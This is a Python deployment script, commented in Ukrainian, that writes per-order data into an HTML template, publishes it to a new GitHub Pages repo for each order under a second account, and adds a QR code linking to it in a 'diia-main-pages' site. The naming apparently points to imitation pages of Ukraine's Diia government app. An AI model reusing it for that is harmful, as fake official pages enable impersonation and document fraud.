"""
chain_deploy.py — v2: НОВИЙ РЕПО ДЛЯ КОЖНОГО ЗАМОВЛЕННЯ

  1. Оновлює 2/index.html даними замовлення
  2. Пушить папку 2/ у НОВИЙ репо: site2-<order_id> (GH_TOKEN_2)
  3. Вмикає GitHub Pages в цьому новому репо
  4. Генерує QR з URL → 1/assets/q.png
  5. Пушить папку 1/ у ПОСТІЙНИЙ репо diia-main-pages (PAGES_GH_TOKEN)
  6. Повертає обидва URL + назву репо

Env vars:
  GH_TOKEN_2      — токен іншого акаунта (repo+pages)
  GH_USERNAME_2   — логін іншого акаунта (опційно)
  PAGES_REPO_2    — prefix для назви репо (default: "site2")
  PAGES_GH_TOKEN  — токен основного акаунта
  GH_USERNAME     — логін основного акаунта (опційно)
  PAGES_REPO_1    — назва репо для папки 1 (default: "diia-main-pages")
"""

from __future__ import annotations

import base64
import logging
import os
import pathlib
import re
import time
from datetime import datetime

import qrcode
import requests

logger = logging.getLogger("chain_deploy")

API = "https://api.github.com"
FOLDER1_DIR = "1"
FOLDER2_DIR = "2"
QR_REL_PATH = "assets/q.png"
INDEX_REL_PATH = "index.html"
BRANCH = "main"


class DeployError(Exception):
    pass


def _headers(token: str) -> dict:
    return {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }


def _gh(token: str, method: str, path: str, **kwargs):
    resp = requests.request(
        method, f"{API}{path}",
        headers=_headers(token),
        timeout=30,
        **kwargs,
    )
    if not resp.ok:
        logger.error("[GH] %s %s -> %s: %s", method, path, resp.status_code, resp.text[:300])
        resp.raise_for_status()
    return resp.json() if resp.text else {}


def _get_username(token: str, override: str | None) -> str:
    if override:
        return override
    return _gh(token, "GET", "/user")["login"]


def _make_repo_name(prefix: str, order_id: str | None) -> str:
    """Унікальна назва репо для кожного замовлення."""
    if order_id:
        safe_id = re.sub(r"[^a-zA-Z0-9_-]", "-", str(order_id))[:30]
        name = f"{prefix}-{safe_id}"
    else:
        ts = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
        name = f"{prefix}-{ts}"
    return name[:100]


def _ensure_repo(token: str, username: str, repo_name: str) -> None:
    try:
        _gh(token, "GET", f"/repos/{username}/{repo_name}")
        logger.info("Repo exists: %s/%s", username, repo_name)
        return
    except requests.HTTPError as e:
        if e.response.status_code != 404:
            raise
    _gh(token, "POST", "/user/repos", json={
        "name": repo_name,
        "description": "FunsDiia order deploy",
        "private": False,
        "auto_init": False,
        "has_issues": False,
        "has_projects": False,
        "has_wiki": False,
    })
    logger.info("Repo created: %s/%s", username, repo_name)
    time.sleep(2)


def _get_file_sha(token: str, username: str, repo: str, path: str) -> str | None:
    try:
        return _gh(token, "GET", f"/repos/{username}/{repo}/contents/{path}",
                   params={"ref": BRANCH}).get("sha")
    except requests.HTTPError:
        return None


def _push_file(token: str, username: str, repo: str, rel_path: str, content: bytes) -> None:
    sha = _get_file_sha(token, username, repo, rel_path)
    payload = {
        "message": f"deploy: {rel_path}",
        "content": base64.b64encode(content).decode(),
        "branch": BRANCH,
    }
    if sha:
        payload["sha"] = sha
    _gh(token, "PUT", f"/repos/{username}/{repo}/contents/{rel_path}", json=payload)


def _collect_files(local_dir: str) -> dict[str, pathlib.Path]:
    root = pathlib.Path(local_dir)
    if not root.is_dir():
        raise DeployError(f"Папка '{local_dir}' не знайдена")
    files = {
        str(f.relative_to(root)).replace("\\", "/"): f
        for f in root.rglob("*")
        if f.is_file()
        and ".git" not in f.parts
        and "__pycache__" not in f.parts
    }
    if not files:
        raise DeployError(f"У папці '{local_dir}' немає файлів")
    return files


def _enable_pages(token: str, username: str, repo: str) -> str:
    url = f"https://{username}.github.io/{repo}/"
    try:
        existing = _gh(token, "GET", f"/repos/{username}/{repo}/pages")
        return existing.get("html_url", url)
    except requests.HTTPError as e:
        if e.response.status_code != 404:
            raise
    _gh(token, "POST", f"/repos/{username}/{repo}/pages",
        json={"source": {"branch": BRANCH, "path": "/"}})
    return url


def _push_folder(
    token: str,
    username: str,
    repo: str,
    files: dict[str, pathlib.Path],
    overrides: dict[str, bytes] | None = None,
) -> None:
    overrides = overrides or {}
    logger.info("Pushing %d files to %s/%s", len(files), username, repo)
    for rel_path, abs_path in files.items():
        content = overrides.get(rel_path, abs_path.read_bytes())
        _push_file(token, username, repo, rel_path, content)


def update_index_in_folder2(values_data: dict) -> None:
    index_path = pathlib.Path(FOLDER2_DIR) / INDEX_REL_PATH
    if not index_path.exists():
        logger.warning("2/index.html не знайдено")
        return
    content = index_path.read_text(encoding="utf-8")
    for key, val in values_data.items():
        content = content.replace(f"{{{{{key}}}}}", str(val))
    index_path.write_text(content, encoding="utf-8")
    logger.info("2/index.html оновлено (%d значень)", len(values_data))


# ─── КЛЮЧОВА ФУНКЦІЯ: окремий репо для кожного замовлення ─────────────────────

def deploy_folder2_for_order(
    values_data: dict | None = None,
    order_id: str | None = None,
) -> str:
    """
    Деплоїть папку 2/ у НОВИЙ унікальний репо для кожного замовлення.
    Назва репо: <PAGES_REPO_2>-<order_id>
    """
    token = os.getenv("GH_TOKEN_2", "").strip()
    if not token:
        raise DeployError("GH_TOKEN_2 не встановлено")

    username = _get_username(token, os.getenv("GH_USERNAME_2", "").strip() or None)
    prefix = os.getenv("PAGES_REPO_2", "site2").strip()

    # ★ Кожне замовлення = окремий репо
    repo_name = _make_repo_name(prefix, order_id)
    logger.info("Order %s -> new repo: %s/%s", order_id, username, repo_name)

    if values_data:
        update_index_in_folder2(values_data)

    _ensure_repo(token, username, repo_name)
    _push_folder(token, username, repo_name, _collect_files(FOLDER2_DIR))

    url = _enable_pages(token, username, repo_name)
    logger.info("Order %s Pages URL: %s", order_id, url)
    return url


# ─── Зворотна сумісність (без order_id) ───────────────────────────────────────

def deploy_folder2(values_data: dict | None = None) -> str:
    """Fallback: деплой без order_id (timestamp як назва репо)."""
    return deploy_folder2_for_order(values_data=values_data, order_id=None)


def generate_qr(target_url: str) -> str:
    qr_path = pathlib.Path(FOLDER1_DIR) / QR_REL_PATH
    qr_path.parent.mkdir(parents=True, exist_ok=True)
    qrcode.make(target_url).save(qr_path)
    logger.info("QR saved: %s -> %s", target_url, qr_path)
    return str(qr_path)


def deploy_folder1() -> str:
    """Пушить папку 1/ в постійний репо (оновлює існуючий)."""
    token = os.getenv("PAGES_GH_TOKEN", "").strip()
    if not token:
        raise DeployError("PAGES_GH_TOKEN не встановлено")

    username = _get_username(token, os.getenv("GH_USERNAME", "").strip() or None)
    repo = os.getenv("PAGES_REPO_1", "diia-main-pages").strip()

    _ensure_repo(token, username, repo)
    _push_folder(token, username, repo, _collect_files(FOLDER1_DIR))

    url = _enable_pages(token, username, repo)
    logger.info("Folder1 Pages URL: %s", url)
    return url


def run_full_chain(values_data: dict | None = None, order_id: str | None = None) -> dict:
    """
    Повний ланцюжок v2:
      1. Оновлює 2/index.html
      2. Деплоїть папку 2/ в НОВИЙ репо site2-<order_id>
      3. Генерує QR
      4. Деплоїть папку 1/ в постійний репо

    Повертає dict з url та метаданими.
    """
    token2 = os.getenv("GH_TOKEN_2", "").strip()
    prefix = os.getenv("PAGES_REPO_2", "site2").strip()
    repo2_name = _make_repo_name(prefix, order_id)

    folder2_url = deploy_folder2_for_order(values_data=values_data, order_id=order_id)
    qr_path = generate_qr(folder2_url)
    folder1_url = deploy_folder1()

    return {
        "folder2_url": folder2_url,
        "folder1_url": folder1_url,
        "qr_path": qr_path,
        "repo2_name": repo2_name,
        "order_id": order_id,
    }
